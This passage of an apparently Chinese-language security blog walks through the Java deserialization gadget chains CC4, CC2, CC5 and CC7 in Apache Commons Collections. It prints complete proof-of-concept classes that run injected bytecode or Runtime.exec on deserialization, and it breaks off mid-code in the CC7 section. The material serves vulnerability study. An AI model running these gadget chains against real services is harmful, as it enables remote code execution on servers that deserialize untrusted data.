class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854475.png"></p><h3 id="å®Œæ•´çš„POCï¼š"><a href="#å®Œæ•´çš„POCï¼š" class="headerlink" title="å®Œæ•´çš„POCï¼š"></a>å®Œæ•´çš„POCï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//ä»£ç æ‰§è¡Œ InstantiateTransformer</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</span><br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="åˆ†æï¼š-1"><a href="#åˆ†æï¼š-1" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p>CC2 å’Œ CC4 å¹¶æ— å¤ªå¤§åŒºåˆ«ï¼ŒCC2 çš„å‰åŠéƒ¨åˆ†åŒæ ·ä¸ºï¼š<font style="color:#080808;background-color:#ffffff;">PriorityQueue.readObject.heapify.siftDown.siftDownUsingComparator.compare</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">TransformingComparator.compare.transform</font></p><p>-&gt; <font style="color:#080808;background-color:#ffffff;">ChainedTransformer.transform</font></p><p><font style="color:#080808;background-color:#ffffff;">ä¹‹åï¼ŒCC4ï¼š</font></p><p><font style="color:rgb(44, 62, 80);">InstantiateTransformer.transform </font></p><p><font style="color:rgb(44, 62, 80);">-&gt; TrAXFilter.TrAXFilter</font></p><p><font style="color:#080808;background-color:#ffffff;">-&gt; TemplatesImpl.newTransforemer</font></p><p>-&gt; TransletClassLoader.newInstance</p><p>CC2:</p><p>InvokerTransformer.transform</p><p><font style="color:#080808;background-color:#ffffff;">-&gt; TemplatesImpl.newTransforemer</font></p><p>-&gt; TransletClassLoader.newInstance</p><h2 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//ä»£ç æ‰§è¡Œ </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        <span class="hljs-comment">//æ”¹ä¸º templates</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//æ”¹ä¸º invokerTransformer</span><br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854831.png"></p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="åˆ†æï¼š-2"><a href="#åˆ†æï¼š-2" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854635.png"></p><p>CC5 çš„èµ·ç‚¹å˜æˆäº† BadAttributeValueExpException,è°ƒç”¨çš„æ˜¯ TiedMapEntry.toString ï¼Œä¹‹åä¾¿æ˜¯ LazyMap.getï¼ˆCC1-LazyMap&#x2F;CC6ï¼‰ã€‚</p><p>è¿™é‡Œä»æ­£å‘èµ°æ¯”è¾ƒæ–¹ä¾¿ï¼Œå¦‚æœä» LazyMap.get å‡ºå‘ï¼Œä¼šç”¨å¾ˆå¤šè°ƒç”¨ get æ–¹æ³•çš„ç±»ï¼Œä¸å¥½æ‰¾ã€‚</p><p>æ¥åˆ° BadAttributeValueExpException ç±»ï¼Œè·Ÿè¿› toString() æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854357.png"></p><p>è¿™é‡Œçš„ toString() æ–¹æ³•è¦æ‰¾åˆ°è°ƒç”¨å®ƒçš„ç±»ï¼Œç„¶åå°±æ‰¾åˆ°äº† TiedMapEntry ç±»ä¸­è°ƒç”¨çš„ toString</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021854464.png"></p><p>getValue è°ƒç”¨äº† map.getï¼Œåç»­ä¾¿æ˜¯ LazyMap è°ƒç”¨ getã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855986.png"></p><h2 id="POCï¼š"><a href="#POCï¼š" class="headerlink" title="POCï¼š"></a>POCï¼š</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// CC1-LazyMap</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;key&quot;</span>);<br>        tiedMapEntry.toString();<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹ BadAttributeValueExpException çš„ val å€¼</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855664.png"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="åˆ†æï¼š-3"><a href="#åˆ†æï¼š-3" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855345.png"></p><p>CC7 çš„å…¥å£ç‚¹å˜æˆäº†ï¼š HashTable.readObject</p><p>HashTable ä¸­çš„ readObject è°ƒç”¨äº† <font style="color:#080808;background-color:#ffffff;">reconstitutionPut</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855669.png"></p><p><font style="color:#080808;background-color:#ffffff;">reconstitutionPutä¸­è°ƒç”¨äº† equals ,</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855139.png"></p><p>å› ä¸º LazyMap ä¸å­˜åœ¨ equals æ–¹æ³•ï¼Œç„¶åæ‰¾åˆ°å®ƒçš„çˆ¶ç±» AbstractMapDecorator è°ƒç”¨ equals </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855169.png"></p><p>æ‰¾åˆ° AbstractMap.equals ä¸­è°ƒç”¨äº† get æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509021855646.png"></p><h2 id="æ„é€ POCï¼š"><a href="#æ„é€ POCï¼š" class="headerlink" title="æ„é€ POCï¼š"></a>æ„é€ POCï¼š</h2><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals"></a>AbstractMap.equals</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMap</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>&lt;K,V&gt; &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­ä¼ å…¥çš„æ˜¯å¦ä¸ºåŒä¸€å¯¹è±¡</span><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">//ç±»å‹æ£€æŸ¥</span><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span 